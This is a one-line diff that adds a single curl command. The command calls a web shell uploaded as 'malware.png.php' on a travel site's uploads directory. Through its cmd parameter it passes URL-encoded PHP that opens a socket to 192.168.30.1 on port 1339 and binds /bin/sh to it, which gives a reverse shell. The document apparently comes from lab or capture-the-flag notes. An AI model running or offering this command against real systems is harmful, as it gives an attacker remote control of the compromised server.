@@ -1,0 +1,1 @@
+curl "http://travel.rogue-sentinels.io/salmon-uploads/malware.png.php?cmd=php%20-r%20'%24sock%3dfsockopen(%22192.168.30.1%22,1339);exec(%22/bin/sh%20%3c%263%20%3e%263%202%3e%263%22);'"
